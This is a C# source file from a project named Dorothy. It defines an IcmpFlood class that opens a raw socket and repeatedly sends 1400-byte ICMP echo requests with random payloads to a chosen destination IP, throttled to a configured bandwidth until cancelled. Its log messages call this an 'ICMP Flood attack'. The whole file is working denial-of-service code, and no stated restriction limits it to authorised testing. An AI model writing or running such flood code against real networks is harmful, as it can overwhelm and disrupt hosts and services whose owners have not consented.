using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;

namespace Dorothy.Models
{
    public class IcmpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private Socket? _socket;
        public event EventHandler<PacketEventArgs>? PacketSent;

        public IcmpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting ICMP Flood attack.");

            try
            {
                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, System.Net.Sockets.ProtocolType.Icmp);
                _socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, false);

                byte[] icmpHeader = new byte[8];
                byte[] payload = new byte[1400];

                var random = new Random();
                // Account for full Ethernet frame: Ethernet header (14) + IP header (20) + ICMP header (8) + payload (1400) + FCS (4)
                // Raw sockets send at Layer 3, OS adds Ethernet frame
                int totalPacketSize = 14 + 20 + icmpHeader.Length + payload.Length + 4; // Ethernet (14) + IP (20) + ICMP (8) + payload (1400) + FCS (4) = 1446 bytes
                double packetsPerSecond = (double)_params.BytesPerSecond / totalPacketSize;
                double microsecondsPerPacket = 1_000_000.0 / packetsPerSecond;
                long ticksPerPacket = (long)(microsecondsPerPacket * Stopwatch.Frequency / 1_000_000.0);

                await Task.Run(() =>
                {
                    var stopwatch = Stopwatch.StartNew();
                    var endpoint = new IPEndPoint(_params.DestinationIp, 0);
                    byte[] fullPacket = new byte[icmpHeader.Length + payload.Length];
                    long nextPacketTime = 0; // Track when next packet should be sent

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            long currentTicks = stopwatch.ElapsedTicks;
                            
                            // Wait until it's time to send the next packet
                            if (currentTicks < nextPacketTime)
                            {
                                long waitTicks = nextPacketTime - currentTicks;
                                long waitMicroseconds = (waitTicks * 1_000_000L) / Stopwatch.Frequency;
                                
                                if (waitMicroseconds > 1000)
                                {
                                    Thread.Sleep((int)(waitMicroseconds / 1000));
                                }
                                
                                // Fine-grained spin wait
                                while (stopwatch.ElapsedTicks < nextPacketTime)
                                {
                                    Thread.SpinWait(10);
                                }
                            }

                            icmpHeader[0] = 8;  // Echo Request
                            random.NextBytes(payload);

                            Buffer.BlockCopy(icmpHeader, 0, fullPacket, 0, icmpHeader.Length);
                            Buffer.BlockCopy(payload, 0, fullPacket, icmpHeader.Length, payload.Length);

                            _socket.SendTo(fullPacket, endpoint);
                            OnPacketSent(fullPacket, _params.SourceIp, _params.DestinationIp, 0);

                            // Schedule next packet
                            nextPacketTime = stopwatch.ElapsedTicks + ticksPerPacket;
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending ICMP packet (Layer 3).");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "ICMP Flood attack failed.");
                throw;
            }
        }

        public void Dispose()
        {
            _socket?.Dispose();
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);
    }
} 